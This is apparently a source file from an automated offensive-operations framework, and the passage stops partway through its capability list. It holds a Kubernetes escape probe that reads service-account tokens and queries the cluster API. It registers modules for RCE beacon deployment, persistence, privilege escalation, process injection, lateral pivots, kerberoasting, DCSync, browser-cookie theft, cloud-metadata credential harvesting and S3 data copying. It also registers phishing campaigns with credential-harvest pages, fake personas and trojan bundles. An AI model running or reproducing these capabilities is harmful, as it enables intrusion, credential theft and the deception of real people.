def _k8s_escape_adapter(wm, slots):
    """Probe a compromised container for Kubernetes escape primitives:
    mounted service-account token (capable list call), privileged pod via
    /dev (cgroup -rw escape), and reachable kubelet node/metrics API.
    Non-destructive: reports the primitive without executing it."""
    return (
        "echo __K8S_START__; "
        # 1) service-account token present -> list cluster objects with it
        "test -r /var/run/secrets/kubernetes.io/serviceaccount/token "
        "&& echo __K8S_SA_TOKEN__ && "
        "K=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); "
        "test -n \"$K\" && curl -m 3 -sk -H \"Authorization: Bearer $K\" "
        "https://kubernetes.default.svc/api/v1/namespaces/default/pods "
        "2>/dev/null | head -c 200 && echo __K8S_SA_ADMIN__ || echo __K8S_SA_RO__; "
        # 2) privileged pod: writable cgroup release_agent (classic escape)
        "test -w /sys/fs/cgroup/release_agent && echo __K8S_PRIV_CGROUP__; "
        "test -f /dev/kmsg && echo __K8S_DEV_HOST__; "
        # 3) kubelet reachable (read-only node access)
        "curl -m 2 -sk https://$(hostname):10250/pods 2>/dev/null "
        "| head -c 100 && echo __K8S_KUBELET__; "
        "echo __K8S_END__"
    )


def _k8s_escape_interp(output, wm, slots):
    from phantom.automation.belief import Finding
    out = output or ""
    primitives = []
    if "__K8S_SA_ADMIN__" in out:
        primitives.append("sa-list-cluster")
    elif "__K8S_SA_TOKEN__" in out:
        primitives.append("sa-token")
    if "__K8S_PRIV_CGROUP__" in out:
        primitives.append("privileged-cgroup")
    if "__K8S_DEV_HOST__" in out:
        primitives.append("dev-host")
    if "__K8S_KUBELET__" in out:
        primitives.append("kubelet")
    if not primitives:
        return []
    return [Finding(kind="k8s_escape", key="->".join(primitives),
                    value={"primitives": primitives, "output": out[:600]},
                    confidence=0.85, source="k8s_escape", target=wm.target)]


def _hunt_web_adapter(wm, slots):
    """Marker stub: the hunt capability executes through the anomaly
    engine channel (in-process), never through the shell — this adapter
    exists to keep the 'adapter is the only command source' invariant."""
    return "hunt://web (anomaly engine, in-process)"


def _hunt_web_interp(output, wm, slots):
    """Parse HUNT: markers into hunt_anomaly findings (behavioural
    bug-class candidates produced by the anomaly engine)."""
    from phantom.automation.belief import Finding
    findings = []
    for line in (output or "").splitlines():
        if not line.startswith("HUNT:"):
            continue
        kv = {}
        for chunk in line[len("HUNT:"):].split():
            if "=" in chunk:
                k, v = chunk.split("=", 1)
                kv[k.strip()] = v.strip()
        cls = kv.get("cls")
        if not cls:
            continue
        key = f"{cls}:{kv.get('port', '?')}:{kv.get('name', 'probe')}"
        findings.append(Finding(
            kind="hunt_anomaly", key=key,
            value={"cls": cls, "name": kv.get("name", ""),
                   "endpoint": kv.get("endpoint", ""),
                   "signals": kv.get("signals", ""),
                   "score": kv.get("score", ""),
                   "confirmed": kv.get("confirmed", "") == "true",
                   "severity": kv.get("severity", "medium"),
                   "port": kv.get("port", ""),
                   "evidence": kv.get("evidence", "")[:300]},
            confidence=0.6, source="hunt_web", target=wm.target))
    return findings


def _sudo_adapter(wm, slots):
    from phantom.automation.post.privesc import sudo_escalation_command
    user, pw = slots.get("username", ""), slots.get("password", "")
    payload = slots.get("payload") or _beacon_payload(wm)
    if not pw:
        raise ValueError("sudo escalation requires the password of the current session")
    return sudo_escalation_command(user, pw, payload)


def _service_perms_adapter(wm, slots):
    from phantom.automation.post.privesc import service_perms_escalation_command
    payload = slots.get("payload") or _beacon_payload(wm)
    return service_perms_escalation_command(payload)


def _beacon_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    if "callback" in (slots or {}):
        return [Finding(kind="beacon", key="established", value={"callback": slots["callback"]},
                        confidence=0.9, source="adapter", target=wm.target)]
    return []


# ── deep protocol fingerprinting ──────────────────────────────────────

def _fingerprint_adapter(wm: WorldModel, slots: Dict[str, Any]) -> str:
    """Adapter: run the deep fingerprint engine against all discovered services."""
    from phantom.automation.fingerprint.probes import FingerprintEngine
    services = wm.find("service")
    if not services:
        return "# no services to fingerprint"
    host = _effective_target(wm)
    engine = FingerprintEngine(timeout=5.0)
    ports = []
    for f in services:
        try:
            port = int(str(f.key).split("/")[-1]) if "/" in str(f.key) else int(f.key)
        except (ValueError, TypeError):
            continue
        ports.append(port)
    if not ports:
        return "# no ports to fingerprint"
    results = engine.probe_all(host, ports)
    # Write findings into world model
    engine.to_worldmodel(wm, host)
    # Return a summary line the perception layer can parse
    if results:
        lines = [f"FINGERPRINT:{r.port}:{r.service}:{r.product or '?'}:{r.version or '?'}"
                 for r in results if r.ok]
        return "\n".join(lines)
    return "# fingerprint produced no results"


def _fingerprint_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    """Interpreter: parse fingerprint result lines into findings."""
    findings = []
    for line in output.split("\n"):
        line = line.strip()
        if not line.startswith("FINGERPRINT:"):
            continue
        parts = line.split(":", 4)  # FINGERPRINT:port:service:product:version
        if len(parts) >= 5:
            port = parts[1]
            service = parts[2]
            product = parts[3] if parts[3] != "?" else ""
            version = parts[4] if parts[4] != "?" else ""
            findings.append(Finding(
                kind="fingerprint", key=f"{service}/{port}",
                value={"port": port, "service": service, "product": product, "version": version},
                confidence=0.85 if version else 0.7,
                source="fingerprint_probe", target=wm.target))
    return findings


# ── differential analysis adapter ─────────────────────────────────────

def _differential_adapter(wm: WorldModel, slots: Dict[str, Any]) -> str:
    """Adapter: run the differential analysis engine on all services."""
    from phantom.automation.exploit.differential import run_differential_analysis
    host = _effective_target(wm)
    findings = run_differential_analysis(wm, host, timeout=5.0)
    if findings:
        lines = [f"DIFF:{a.host}:{a.port}:{a.service}:{a.cls}:{a.severity}:{a.score:.2f}"
                 for a in findings]
        return "\n".join(lines)
    return "# differential analysis produced no confirmed anomalies"


def _differential_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    """Interpreter: parse differential findings into the world model."""
    findings = []
    for line in output.split("\n"):
        line = line.strip()
        if not line.startswith("DIFF:"):
            continue
        parts = line.split(":", 5)
        if len(parts) >= 6:
            host, port, service, cls, severity, score = parts[1:7]
            findings.append(Finding(
                kind="differential_anomaly", key=f"{service}/{port}/{cls}",
                value={"host": host, "port": port, "service": service,
                       "cls": cls, "severity": severity, "score": score},
                confidence=0.85 if severity in ("critical", "high") else 0.6,
                source="differential_analysis", target=host))
    return findings


CAPABILITIES = [
    _mk("fingerprint_services", "recon",
        "Deep protocol fingerprint: socket-level probes for 15+ protocols "
        "(SMB, MySQL, Redis, MongoDB, SSH, FTP, SMTP, SNMP, LDAP, RDP, "
        "PostgreSQL, MSSQL, Docker, Kubernetes, DNS) extracting structured "
        "data beyond nmap -sV — no external tools required",
        [],
        ["fingerprint"], _fingerprint_adapter, _fingerprint_interp,
        opsec_cost=1.5, detection_risk=0.2, stealth_level="stealth", timeout=60,
        preconditions=[_has_network_host(), _has_finding("service")],
        banner="deep fingerprint", tools=[]),

    _mk("scan_tcp", "recon", "TCP port scan of the target",
        [_mk_slot("port", "port", False, "comma-separated ports (default: top 100)")],
        ["service"], _port_scan_adapter, _interp_nmap_ports,
        opsec_cost=2.0, detection_risk=0.35, stealth_level="active", timeout=240,
        preconditions=[_has_network_host()], banner="port scan", tools=["nmap"]),

    _mk("version_detect", "recon", "Service version fingerprinting",
        [_mk_slot("port", "port", False, "target port")],
        ["service", "version"], _version_adapter, _interp_nmap_ports,
        opsec_cost=2.5, detection_risk=0.3, stealth_level="active", timeout=240,
        preconditions=[_has_network_host()], banner="version detect", tools=["nmap"]),

    _mk("service_exploit", "exploit",
        "Version-matched exploit: match the fingerprinted software@version "
        "to the CVE module registry and synthesize the msfconsole command "
        "(resource script + payload resolved for the target platform)",
        [_mk_slot("payload", "str", False, "payload platform hint (auto)")],
        ["exploit_plan"], _service_exploit_adapter, _service_exploit_interp,
        opsec_cost=4.0, detection_risk=0.7, stealth_level="active",
        forceful=True, timeout=120,
        preconditions=[_has_network_host(), _has_finding("service")],
        banner="version-matched exploit", tools=["msfconsole"]),

    _mk("hunt_web", "hunt",
        "Behavioural bug-class hunting: endpoint discovery (robots.txt, "
        "sitemap.xml, homepage crawl, common paths), baseline + statistical "
        "anomaly scoring (status/size/timing/body markers), validation "
        "pass (confirmed/severity), mutation escalation on the winning "
        "payload, session cookies when stolen — candidates, not verdicts, "
        "no LLM, deterministic and bounded",
        [_mk_slot("port", "port", False, "web port (default: all web services)")],
        ["hunt_anomaly"], _hunt_web_adapter, _hunt_web_interp,
        opsec_cost=1.0, detection_risk=0.25, stealth_level="active",
        forceful=True, timeout=120,
        preconditions=[_has_network_host(), _has_finding("service")],
        banner="behavioural hunt", tools=[]),

    _mk("differential_analysis", "hunt",
        "Protocol-agnostic differential analysis: baseline each service, "
        "send mutated probes (SQLi/SSTI/traversal/SSRF/XXE for HTTP, "
        "protocol-specific mutations for SMB/MySQL/Redis/SSH/FTP/LDAP), "
        "score against baseline (status/size/timing/body markers), "
        "validate top anomalies, report confirmed findings",
        [], ["differential_anomaly"], _differential_adapter, _differential_interp,
        opsec_cost=1.5, detection_risk=0.3, stealth_level="active",
        forceful=True, timeout=120,
        preconditions=[_has_network_host(), _has_finding("service")],
        banner="differential analysis", tools=[]),

    _mk("rce_foothold", "exploit",
        "Turn a CONFIRMED code-execution candidate into a verified foothold "
        "(no credentials): SSTI -> command execution marker, SSRF -> cloud "
        "metadata IAM creds, RCE-class exploit plan -> msf session watch",
        [], ["rce_foothold"], _rce_foothold_adapter, _rce_foothold_interp,
        opsec_cost=2.0, detection_risk=0.5, stealth_level="active",
        forceful=True, timeout=90,
        preconditions=[_has_network_host(), _has_confirmed_rce()],
        banner="verify RCE foothold", tools=["curl"]),

    _mk("beacon_via_rce", "exploit",
        "Inject our C++ beacon THROUGH the confirmed RCE channel — the "
        "senior move that reaches C2 access from a code-execution primitive "
        "without ever needing credentials",
        [_mk_slot("command", "command", True, "beacon dropper command line")],
        ["beacon"], _beacon_via_rce_adapter, None,
        opsec_cost=5.0, detection_risk=0.85, stealth_level="aggressive", timeout=60,
        preconditions=[_has_network_host(), _has_finding("rce_foothold")],
        banner="beacon via RCE", tools=["curl"]),

    _mk("env_probe", "recon",
        "Recognize the environment from the outside: exposed Docker/K8s "
        "management APIs and SCADA/ICS port classes — the senior operator "
        "knows the battlefield before choosing weapons",
        [], ["environment"], _env_probe_adapter, _env_probe_interp,
        opsec_cost=0.6, detection_risk=0.1, stealth_level="passive", timeout=45,
        preconditions=[_has_network_host()],
        banner="environment probe", tools=["curl"]),

    _mk("env_probe_internal", "post",
        "Recognize the environment FROM INSIDE the beacon: container "
        "markers (/proc/1/cgroup, /.dockerenv) and AWS metadata via the "
        "IMDS v2 token flow — the vantage the outside probe cannot reach "
        "(link-local metadata is only valid from the box itself)",
        [], ["environment"], _env_internal_adapter, _env_probe_interp,
        opsec_cost=0.4, detection_risk=0.05, stealth_level="passive", timeout=30,
        preconditions=[_has_beacon()],
        banner="internal environment probe"),

    _mk("os_detect", "recon", "Remote OS fingerprinting",
        [], ["os"], _os_adapter, _interp_nmap_os,
        opsec_cost=3.0, detection_risk=0.4, stealth_level="aggressive", timeout=120,
        preconditions=[_has_network_host()], banner="os detect", tools=["nmap"]),

    _mk("http_probe", "recon", "HTTP banner/title/CMS fingerprint",
        [_mk_slot("url", "url", False, "full URL (default: http://target)")],
        ["web_header", "web_title", "web_app"], _http_probe_adapter, _interp_http,
        opsec_cost=0.5, detection_risk=0.1, stealth_level="passive", timeout=30,
        preconditions=[_has_network_host()], banner="http probe", tools=["curl"]),

    _mk("http_get", "recon", "Fetch HTTP page content",
        [_mk_slot("url", "url", True, "full URL")],
        ["web_content"], _http_get_adapter, None,
        opsec_cost=0.5, detection_risk=0.1, stealth_level="passive", timeout=30,
        preconditions=[_has_network_host()], banner="http get", tools=["curl"]),

    _mk("smb_enum", "service", "Enumerate SMB shares and permissions",
        [_mk_slot("host", "host", False, "SMB host (default: target)")],
        ["smb_share"], _smb_enum_adapter, _interp_smb,
        opsec_cost=1.5, detection_risk=0.25, stealth_level="active", timeout=60,
        preconditions=[_has_network_host()], banner="smb enum", tools=["smbmap"]),

    _mk("redis_info", "service", "Pull Redis INFO (version, role, auth state)",
        [_mk_slot("port", "port", False, "Redis port (default 6379)")],
        ["redis"], _redis_info_adapter, _interp_redis,
        opsec_cost=0.8, detection_risk=0.15, stealth_level="active", timeout=30,
        preconditions=[_has_network_host()], banner="redis info", tools=["redis-cli"]),

    _mk("ssh_banner", "service", "Grab SSH banner for version analysis",
        [_mk_slot("port", "port", False, "SSH port (default 22)")],
        ["banner"], _ssh_banner_adapter, _interp_ssh_banner,
        opsec_cost=0.3, detection_risk=0.05, stealth_level="passive", timeout=15,
        preconditions=[_has_network_host()], banner="ssh banner", tools=["nc"]),

    _mk("ssh_login", "creds", "Single credential pair check over SSH",
        [_mk_slot("username", "username", True, "account"), _mk_slot("password", "password", True, "password")],
        ["creds"], _ssh_login_adapter, None,
        opsec_cost=1.2, detection_risk=0.45, stealth_level="aggressive", timeout=20,
        preconditions=[_has_service_kind("service", "ssh"), _has_network_host()],
        banner="ssh login", tools=["sshpass"]),

    _mk("web_creds", "exploit",
        "Web credential extraction: SSRF file-read primitives and SQLi "
        "auth-bypass/UNION dumps on discovered web services — the senior "
        "move when the app leaks the database instead of brute-forcing "
        "SSH (deterministic, bounded, zero external tools)",
        [], ["creds"], _web_creds_adapter, _web_creds_interp,
        opsec_cost=1.4, detection_risk=0.25, stealth_level="active",
        timeout=120, preconditions=[_has_web_service()],
        banner="web credential extraction", tools=["curl"]),

    _mk("web_rce", "exploit",
        "Arbitrary-file-upload -> RCE probe on the web app: upload a tiny "
        "python script and check for the execution marker. Real code "
        "execution without any credentials — skips the whole credential "
        "hunting phase when the app has a report-generator RCE",
        [], ["rce_foothold"], _web_rce_adapter, _web_rce_interp,
        opsec_cost=1.6, detection_risk=0.35, stealth_level="active",
        timeout=30, preconditions=[_has_web_service()],
        banner="web upload RCE probe", tools=["curl"]),

    _mk("osint_identity", "osint",
        "OSINT discovery on an identity target (username/email/phone): "
        "platforms, profiles, public links (sherlock / theHarvester)",
        [], ["identity"], _osint_identity_adapter, _social_interp,
        opsec_cost=0.8, detection_risk=0.1, stealth_level="passive", timeout=120,
        preconditions=[_has_target_type("username", "email", "phone")],
        banner="osint identity"),

    _mk("breach_check", "osint",
        "Breach-dump lookup for an email/username -> leaked credentials",
        [], ["creds"], _breach_check_adapter, _social_interp,
        opsec_cost=0.6, detection_risk=0.05, stealth_level="passive", timeout=30,
        preconditions=[_has_target_type("email", "username")],
        banner="breach check"),

    _mk("persona_create", "social",
        "Create a disposable persona with a temp mailbox for social engineering",
        [], ["identity"], _persona_create_adapter, _social_interp,
        opsec_cost=0.3, detection_risk=0.05, stealth_level="passive", timeout=30,
        preconditions=[_has_target_type("username", "email", "phone")],
        banner="create persona"),

    _mk("phish_identity", "social",
        "Deliver a phish (email for email targets, sms for phones) with an "
        "IP-grabbing link to convert the identity into a machine target",
        [], ["phish"], _phish_adapter, _social_interp,
        opsec_cost=1.8, detection_risk=0.5, stealth_level="active", timeout=60,
        preconditions=[_has_target_type("username", "email", "phone"),
                       _has_finding("identity"), _not_private_profile()],
        banner="phish identity"),

    _mk("poll_hits", "social",
        "Poll the IP-grabber for victim clicks -> victim machine IP",
        [], ["victim_ip"], _poll_hits_adapter, _social_interp,
        opsec_cost=0.2, detection_risk=0.0, stealth_level="passive", timeout=120,
        preconditions=[_has_target_type("username", "email", "phone"),
                       _has_sent_lure(), _not_profile_known()],
        banner="poll grabber hits"),

    _mk("campaign_launch", "social",
        "Launch a full phishing campaign: personalized pretext lures "
        "(security alert, IT, HR, recruiter, delivery...) with open-tracking "
        "pixels and credential-harvest login pages",
        [_mk_slot("pretext", "str", False,
                  "security_alert|it_helpdesk|hr_benefits|recruiter|"
                  "package_delivery|password_reset|doc_share")],
        ["phish"], _campaign_adapter, _social_interp,
        opsec_cost=2.5, detection_risk=0.6, stealth_level="active", timeout=90,
        preconditions=[_has_target_type("username", "email", "phone"),
                       _has_finding("identity"), _not_private_profile()],
        banner="launch campaign"),

    _mk("harvest_campaign", "social",
        "Poll campaigns for opens, clicks (victim IP) and harvested "
        "credentials from fake login pages",
        [], ["victim_ip", "creds"], _harvest_adapter, _social_interp,
        opsec_cost=0.2, detection_risk=0.0, stealth_level="passive", timeout=120,
        preconditions=[_has_target_type("username", "email", "phone"),
                       _has_sent_lure(), _harvest_flow()],
        banner="harvest campaign"),

    _mk("dm_launch", "social",
        "Send short direct messages (Telegram/Discord) with tracking links "
        "to the discovered handles — a DM click converts to a victim IP",
        [_mk_slot("pretext", "str", False,
                  "security_verify|recruiter|collab|prize|invoice")],
        ["dm_sent", "phish"], _dm_adapter, _social_interp,
        opsec_cost=2.0, detection_risk=0.6, stealth_level="active", timeout=60,
        preconditions=[_has_target_type("username", "email"),
                       _dm_ready()],
        banner="send DMs"),

    _mk("dm_follow", "social",
        "Send a follow request to a PRIVATE account before the DM: the "
        "target must accept before the DM can be delivered",
        [], ["follow_sent"], _dm_adapter, _social_interp,
        opsec_cost=1.0, detection_risk=0.2, stealth_level="passive", timeout=30,
        preconditions=[_has_target_type("username"), _has_finding("profile")],
        banner="follow private account"),

    _mk("wait_follow", "social",
        "Wait for the target to accept the follow request (sleep state: "
        "the run pauses for the human, short under the fast flag)",
        [], ["follow_accepted"], _harvest_adapter, _social_interp,
        opsec_cost=0.1, detection_risk=0.0, stealth_level="passive", timeout=120,
        preconditions=[_has_target_type("username"), _has_finding("follow_sent")],
        banner="wait for follow accept"),

    _mk("persona_profile", "social",
        "Create a coherent social cover (name, age, job, city, interests, "
        "bio, avatar) so the attacker identity is believable on platforms",
        [], ["persona_profile"], _persona_profile_adapter, _social_interp,
        opsec_cost=0.3, detection_risk=0.0, stealth_level="passive", timeout=30,
        preconditions=[_has_target_type("username", "email", "phone")],
        banner="build persona profile"),

    _mk("dossier_analyze", "social",
        "Build the strategic target dossier: breach correlation across "
        "email/phone + recommended pretext for a single high-quality lure",
        [], ["dossier"], _dossier_adapter, _social_interp,
        opsec_cost=0.2, detection_risk=0.0, stealth_level="passive", timeout=30,
        preconditions=[_has_target_type("username", "email", "phone"),
                       _has_finding("identity")],
        banner="analyze target dossier"),

    _mk("profile_recon", "social",
        "Reverse-engineering of a target social profile: private/public "
        "state, bio + link in bio, @handles, and same-handle accounts on "
        "other platforms (sherlock) — pure OSINT, no scraping of private "
        "content. Username targets use the handle directly; an EMAIL target "
        "is mapped through its local-part handle (mario.rossi@x.com -> "
        "mario.rossi) so the reverse pass runs for every identity type that "
        "OSINT can pin a handle on",
        [_mk_slot("platform", "str", False,
                  "instagram|tiktok|x|github|reddit|telegram")],
        ["profile", "account_link"], _profile_recon_adapter, _social_interp,
        opsec_cost=0.5, detection_risk=0.0, stealth_level="passive", timeout=60,
        preconditions=[_has_target_type("username", "email")],
        banner="profile reverse-engineering"),

    _mk("beacon_deploy", "beacon", "Execute a beacon/payload command on target",
        [_mk_slot("command", "command", True, "payload command line")],
        ["beacon"], _beacon_adapter, _beacon_interp,
        opsec_cost=5.0, detection_risk=0.8, stealth_level="aggressive", timeout=30,
        preconditions=[_has_creds(), _has_network_host()], banner="beacon deploy"),

    _mk("persistence_install", "post",
        "Install beacon persistence (runkey/scheduled_task/service, cron/profile/systemd)",
        [_mk_slot("method", "str", False, "runkey|scheduled_task|service|cron|profile|systemd")],
        ["persistence"], _persist_adapter,
        interpreter=_interp_from("persistence_interpreter"),
        opsec_cost=3.0, detection_risk=0.7, stealth_level="aggressive", timeout=45,
        preconditions=[_has_beacon()], banner="persistence install"),

    _mk("privesc_system", "post",
        "Escalate the beacon to SYSTEM/root (service obj=LocalSystem, root unit)",
        [], ["system_privilege"], _privesc_adapter,
        interpreter=_interp_from("privesc_interpreter"),
        opsec_cost=4.0, detection_risk=0.8, stealth_level="aggressive", timeout=60,
        preconditions=[_has_beacon()], banner="privesc to SYSTEM"),

    _mk("inject_beacon", "post",
        "Inject the beacon into a privileged process (winlogon / root unit)",
        [_mk_slot("target_process", "str", False, "process name to inject into")],
        ["injection"], _inject_adapter,
        interpreter=_interp_from("inject_interpreter"),
        opsec_cost=4.5, detection_risk=0.85, stealth_level="aggressive", timeout=60,
        preconditions=[_has_system_privilege()], banner="beacon process injection"),

    _mk("privesc_sudo", "post",
        "Linux: escalate the beacon to root through sudo (-S, known password)",
        [_mk_slot("username", "username", True, "account"),
         _mk_slot("password", "password", True, "password")],
        ["system_privilege"], _sudo_adapter,
        interpreter=_interp_from("privesc_interpreter"),
        opsec_cost=3.5, detection_risk=0.5, stealth_level="active", timeout=45,
        preconditions=[_has_beacon()], banner="privesc via sudo", tools=["sudo"]),

    _mk("privesc_service_perms", "post",
        "Windows: service with weak permissions -> run beacon as LocalSystem",
        [], ["system_privilege"], _service_perms_adapter,
        interpreter=_interp_from("privesc_interpreter"),
        opsec_cost=4.0, detection_risk=0.75, stealth_level="aggressive", timeout=60,
        preconditions=[_has_beacon()], banner="privesc via service perms"),

    _mk("ad_enum", "ad",
        "Enumerate the Active Directory domain (ldapsearch): users, groups, "
        "SPNs, trusts and naming context. Runs from the operator when no "
        "beacon session exists yet, through the beacon when one is up.",
        [], ["ad_domain"], _ad_enum_adapter,
        interpreter=_interp_from("ad_enum_interpreter"),
        opsec_cost=2.0, detection_risk=0.4, stealth_level="active", timeout=45,
        preconditions=[_has_ad_service()], banner="AD domain enumeration",
        tools=["ldapsearch"]),

    _mk("kerberoast", "ad",
        "Request SPN TGS tickets (GetUserSPNs.py) -> crackable AD credentials",
        [_mk_slot("username", "username", True, "domain account"),
         _mk_slot("password", "password", True, "password")],
        ["ad_creds"], _kerberoast_adapter,
        interpreter=_interp_from("kerberoast_interpreter"),
        opsec_cost=3.5, detection_risk=0.6, stealth_level="aggressive",
        forceful=True, timeout=90,
        preconditions=[_has_ad_domain(), _has_creds()],
        banner="kerberoast SPN tickets", tools=["GetUserSPNs.py"]),

    _mk("lateral_pivot", "post",
        "Deploy a new beacon to a peer host with known credentials (lateral movement)",
        [_mk_slot("host", "host", False, "peer host to pivot to"),
         _mk_slot("username", "username", True, "account"),
         _mk_slot("password", "password", True, "password")],
        ["pivot"], _lateral_adapter,
        interpreter=_interp_from("lateral_interpreter"),
        opsec_cost=4.5, detection_risk=0.7, stealth_level="aggressive",
        forceful=True, timeout=60,
        preconditions=[_has_beacon(), _has_creds()],
        banner="lateral pivot", tools=["sshpass"]),

    _mk("smb_pivot", "post",
        "Windows: PsExec-style beacon deploy to a peer over SMB (pass-the-hash supported)",
        [_mk_slot("host", "host", False, "peer Windows host to pivot to"),
         _mk_slot("username", "username", True, "account"),
         _mk_slot("password", "password", True, "password or NTLM hash")],
        ["pivot"], _smb_adapter,
        interpreter=_interp_from("smb_pivot_interpreter"),
        opsec_cost=4.8, detection_risk=0.8, stealth_level="aggressive",
        forceful=True, timeout=90,
        preconditions=[_has_beacon(), _has_creds()],
        banner="smb pivot (psexec)", tools=["psexec.py"]),

    _mk("winrm_pivot", "post",
        "Windows: beacon deploy to a peer over WinRM (evil-winrm)",
        [_mk_slot("host", "host", False, "peer Windows host to pivot to"),
         _mk_slot("username", "username", True, "account"),
         _mk_slot("password", "password", True, "password")],
        ["pivot"], _winrm_adapter,
        interpreter=_interp_from("winrm_pivot_interpreter"),
        opsec_cost=4.6, detection_risk=0.75, stealth_level="aggressive",
        forceful=True, timeout=90,
        preconditions=[_has_beacon(), _has_creds()],
        banner="winrm pivot", tools=["evil-winrm"]),

    _mk("as_rep_roast", "ad",
        "AS-REP roasting (GetNPUsers.py) for accounts without pre-authentication",
        [_mk_slot("username", "username", True, "domain account"),
         _mk_slot("password", "password", True, "password")],
        ["ad_creds"], _as_rep_adapter,
        interpreter=_interp_from("as_rep_interpreter"),
        opsec_cost=3.5, detection_risk=0.6, stealth_level="aggressive",
        forceful=True, timeout=90,
        preconditions=[_has_ad_domain(), _has_creds()],
        banner="AS-REP roast", tools=["GetNPUsers.py"]),

    _mk("dc_sync", "ad",
        "DCSync: replicate NTLM hashes from the DC (secretsdump.py -just-dc)",
        [_mk_slot("username", "username", True, "domain account"),
         _mk_slot("password", "password", True, "password or NTLM hash")],
        ["ad_creds"], _dc_sync_adapter,
        interpreter=_interp_from("dc_sync_interpreter"),
        opsec_cost=5.5, detection_risk=0.9, stealth_level="aggressive",
        forceful=True, timeout=120,
        preconditions=[_has_ad_domain(), _has_system_privilege()],
        banner="DCSync hash dump", tools=["secretsdump.py"]),

    _mk("hash_crack", "ad",
        "Crack a captured AD hash offline (john: krb5tgs / krb5asrep / nt)",
        [_mk_slot("hash", "hash", False, "captured hash (from kerberoast / as_rep / dc_sync)")],
        # NOTE: 'creds' is deliberately NOT declared here. hash_crack only
        # yields reusable domain creds AFTER a captured hash is cracked —
        # declaring it would make the backward-chainer believe 'creds' is
        # already produced the moment hash_crack is planned (e.g. a cold
        # goal=crack run), silently dropping the real acquisition chain
        # (ssh_login/web_creds) the beacon needs. The interpreter still
        # emits creds at runtime once a hash actually cracks.
        ["cracked"], _hash_crack_adapter,
        interpreter=_interp_from("hash_crack_interpreter"),
        opsec_cost=6.0, detection_risk=0.2, stealth_level="passive", timeout=180,
        preconditions=[_has_ad_domain(), _has_ad_hash()],
        banner="crack AD hash", tools=["john"]),

    _mk("cleanup", "post",
        "Operational hygiene: remove persistence and kill the beacon process",
        [], ["cleanup"], _cleanup_adapter,
        interpreter=_interp_from("cleanup_interpreter"),
        opsec_cost=2.0, detection_risk=0.3, stealth_level="active", timeout=45,
        preconditions=[_has_beacon()], banner="cleanup target"),

    _mk("cookie_stealer", "post",
        "Steal browser session cookies from the beacon (Chrome/Edge DPAPI "
        "cookies-json built-in)",
        [], ["stolen_cookies"], _cookies_adapter,
        interpreter=_interp_from("cookies_interpreter"),
        opsec_cost=1.5, detection_risk=0.5, stealth_level="active", timeout=30,
        preconditions=[_has_beacon()], banner="steal browser cookies"),

    _mk("bt_scan", "post",
        "Bluetooth proximity radar from the beacon (bt-scan-json built-in): "
        "nearby devices, MACs, RSSI",
        [], ["bt_device"], _bt_scan_adapter,
        interpreter=_interp_from("bt_scan_interpreter"),
        opsec_cost=0.5, detection_risk=0.1, stealth_level="active", timeout=30,
        preconditions=[_has_beacon()], banner="bluetooth proximity scan"),

    _mk("cdp_pivot", "post",
        "Chrome DevTools pivot: pull live session cookies out of a running "
        "Chrome via CDP (cdp-cookies built-in)",
        [_mk_slot("port", "port", False, "CDP debug port (default 9222)")],
        ["cdp_cookies"], _cdp_cookies_adapter,
        interpreter=_interp_from("cdp_cookies_interpreter"),
        opsec_cost=1.8, detection_risk=0.6, stealth_level="aggressive", timeout=45,
        preconditions=[_has_beacon()], banner="cdp cookie pivot"),

    _mk("socks_proxy", "post",
        "Start a SOCKS5 proxy pivot from the beacon (socks built-in): route "
        "tools through the compromised host",
        [_mk_slot("port", "port", False, "local SOCKS port (default 1080)")],
        ["socks_proxy"], _socks_adapter,
        interpreter=_interp_from("socks_interpreter"),
        opsec_cost=2.0, detection_risk=0.7, stealth_level="active", timeout=30,
        preconditions=[_has_beacon()], banner="socks5 pivot"),

    _mk("ransom_sim", "post",
        "Non-destructive ransomware simulation from the beacon: quarantines "
        "files into a vault (never encrypted/deleted), manifest allows full "
        "rollback",
        [_mk_slot("dir", "str", False, "directory to simulate impact on (default: .)")],
        ["ransom_sim"], _ransom_sim_adapter,
        interpreter=_interp_from("ransom_sim_interpreter"),
        opsec_cost=3.0, detection_risk=0.9, stealth_level="aggressive",
        forceful=True, timeout=60,
        preconditions=[_has_beacon()], banner="ransomware simulation"),

    _mk("trojan_deliver", "post",
        "Supply-chain delivery: embed the staged beacon payload inside a "
        "legitimate carrier (trojan overlay, carrier bytes untouched) and "
        "drop the bundle on the target",
        [_mk_slot("carrier", "path", False, "legit binary to hide the payload in"),
         _mk_slot("payload", "path", False, "staged beacon binary to embed"),
         _mk_slot("bundle", "path", False, "pre-built bundle path (skips staging)"),
         _mk_slot("dir", "str", False, "target drop dir (default: .)")],
        ["trojan_bundle"], _trojan_deliver_adapter,
        interpreter=_interp_from("trojan_deliver_interpreter"),
        opsec_cost=4.0, detection_risk=0.7, stealth_level="aggressive",
        forceful=True, timeout=90,
        preconditions=[_has_beacon()], banner="trojan bundle delivery"),

    _mk("cloud_creds_harvest", "post",
        "Harvest cloud provider credentials from INSIDE the box via the "
        "instance-metadata service (IMDSv2 token + role endpoint): AWS "
        "169.254.169.254, GCP metadata.google.internal, Azure "
        "169.254.169.254 (managed identity). The operator side cannot reach "
        "link-local metadata of a remote box, so this must run on the beacon.",
        [], ["cloud_creds", "environment"], _cloud_creds_adapter, _cloud_creds_interp,
        opsec_cost=0.5, detection_risk=0.2, stealth_level="passive", timeout=45,
        preconditions=[_has_beacon(), _has_env_container()],
        banner="cloud metadata harvest"),

    _mk("cloud_s3_enum", "post",
        "With harvested AWS IAM creds, enumerate the account: list buckets "
        "(s3 ls), whoami (sts), and copy interesting objects — turns stolen "
        "instance-role credentials into data access",
        [_mk_slot("provider", "str", False, "cloud provider (aws|gcp|azure)")],
        ["cloud_access", "stolen_data"], _cloud_s3_adapter, _cloud_s3_interp,
        opsec_cost=1.2, detection_risk=0.5, stealth_level="active", timeout=60,
        preconditions=[_has_cloud_creds()],
        banner="cloud object storage enumerate"),

    _mk("cloud_iam_enum", "post",
        "With harvested AWS creds: read-only IAM enumeration — attached role "
        "policies, assumable roles (iam:ListRoles), account ID/summary. "
        "Discovers the lateral movement surface inside the account",
        [], ["cloud_access", "cloud_lateral"], _cloud_iam_enum_adapter,
        _cloud_iam_enum_interp,
        opsec_cost=0.8, detection_risk=0.3, stealth_level="active", timeout=45,
        preconditions=[_has_cloud_creds()],
